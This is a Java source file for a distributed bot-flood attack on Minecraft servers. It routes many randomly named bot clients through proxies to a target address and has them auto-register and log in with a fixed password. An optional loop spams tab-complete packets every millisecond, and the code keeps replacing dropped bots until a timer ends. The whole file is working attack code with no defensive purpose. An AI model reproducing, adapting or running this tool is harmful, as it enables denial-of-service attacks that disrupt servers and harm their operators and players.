package me.alikomi.endminecraft.tasks.attack;

import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class DistributedBotAttack extends Util {

    private static String ip;
    private static int port;
    private static long time;
    private static int sleepTime;
    private Map<String, Proxy.Type> ips;
    private static boolean enableTab;
    private static Lock lock = new ReentrantLock();
    private HashMap<String, Client> connects = new HashMap<>();
    private static boolean isAttack = true;
    private static int index = 0;
    private static List<String> ipsKey;


    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean enableTab) {
        this.ip = ip;
        this.port = port;
        this.time = time;
        this.sleepTime = sleepTime;
        this.ips = ips;
        this.enableTab = enableTab;
        this.ipsKey = Arrays.asList(ips.keySet().toArray(new String[ips.size()]));
    }

    public boolean startAttack() {
        log(ips);
        log("代理数量： " +ips.size());
        log("正在初始化...");
        ips.forEach((po, tp) -> {
            if (po.contains(":")) {
                connects.put(po, start(tp, po));
            }
        });
        List<Thread> li = new ArrayList<>();
        for (Client c : connects.values()) {
            li.add(new Thread(() -> {
                c.getSession().setReadTimeout(5000);
                c.getSession().setWriteTimeout(3500);
                c.getSession().connect();
            }));
        }
        log("初始化完毕..正在启动");

        li.forEach((t) -> {
            t.start();
            try {
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });

        clearThread();

        getPlayersThread();

        checkAddPlayersThread();

        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        isAttack = false;
        for (Client conn : connects.values()) {
            if (conn.getSession().isConnected())
                conn.getSession().disconnect("Timeout，停止攻击");
        }


        return true;
    }

    public static String getRandomString(int length) {
        String str = "_abcde_fghijk_lmno_pqrst_uvw_xyzABCD_EFGHIJKLM_NOPQR_STUVWXY_Z012345_6789_";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; ++i) {
            int number = random.nextInt(74);// [0,62)
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }

    private Client start(Proxy.Type tp, String po) {
        MinecraftProtocol mc = new MinecraftProtocol(getRandomString(new Random().nextInt(9) % (9 - 4 + 1) + 4));
        Proxy proxy = new Proxy(tp, new InetSocketAddress(po.split(":")[0], Integer.parseInt(po.split(":")[1])));
        final Client client = new Client(ip, port, mc, new TcpSessionFactory(proxy));
        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                    new Thread(() -> {
                        try {
                            Thread.sleep(new Random().nextInt(2000) % (2000 - 1000 + 1) + 1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        
                        client.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));

                        try {
                            Thread.sleep(new Random().nextInt(2000) % (2000 - 1000 + 1) + 1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        client.getSession().send(new ClientChatPacket("/login qwnmopzx123"));
                    }).start();

                    if (enableTab) {
                        new Thread(() -> {
                            while (client.getSession().isConnected()) {
                                client.getSession().send(new ClientTabCompletePacket("/"));
                                try {
                                    Thread.sleep(1);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }
            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void connected(ConnectedEvent connectedEvent) {

            }

            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            public void disconnected(DisconnectedEvent disconnectedEvent) {
                String msg = disconnectedEvent.getReason();
                if (msg.contains("refused") ||msg.contains("here") || !isAttack) return;
                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
            }
        });
        return client;
    }

    private void clearThread() {
        new Thread(() -> {
            while (isAttack) {
                List<String> list = new ArrayList<>();
                try {
                    connects.forEach((k, v) -> {
                        if (v != null && v.getSession() != null) {
                            if (! v.getSession().isConnected()) {
                                list.add(k);
                            }
                        } else {
                            list.add(k);
                        }
                    });
                }catch (Exception e) {
                    e.printStackTrace();
                }
                log("清理了：" + list.size() + " 个线程");
                lock.lock();
                list.forEach((s -> connects.remove(s)));
                lock.unlock();
                System.gc();
                try {
                    Thread.sleep(2700);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void getPlayersThread() {
        new Thread(() -> {
            while (isAttack) {
                try {
                    log("            当前连接Client：" + getHttpReq("http://www.mckuai.com/fuzhuApply.do", "act=testIp&ip=" + ip, "GBK"));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void checkAddPlayersThread() {
        new Thread(() -> {
            while (isAttack) {
                try {
                    Thread.sleep(1500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                int con = connects.size();
                int ipss = ips.size();
                log("当前Client： " + con + "最大Client： " + ipss);
                if (con < ipss) {
                    for (int i = 0; i < ipss - con; i++) {
                        if (index >= ipsKey.size() - 1) index = 0;
                        Proxy.Type tp = ips.get(ipsKey.get(index));
                        String po = ipsKey.get(index);

                        while (!po.contains(":")) {
                            log(":");
                            index++;
                            if (index >= ipsKey.size() - 1) {
                                index = 0;
                                break;
                            }
                            tp = ips.get(ipsKey.get(index));
                            po = ipsKey.get(index);
                        }

                        while (connects.containsKey(po)) {
                            index++;
                            if (index >= ipsKey.size() - 1) {
                                index = 0;
                                break;
                            }
                            tp = ips.get(ipsKey.get(index));
                            po = ipsKey.get(index);
                        }
                        if (!po.contains(":")) continue;
                        Client c = start(tp, po);
                        index++;
                        lock.lock();
                        connects.put(po, c);
                        lock.unlock();
                        new Thread(() -> {
                            c.getSession().setReadTimeout(5000);
                            c.getSession().setWriteTimeout(3500);
                            c.getSession().connect();
                        }).start();
                        try {
                            Thread.sleep(sleepTime);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();
    }
}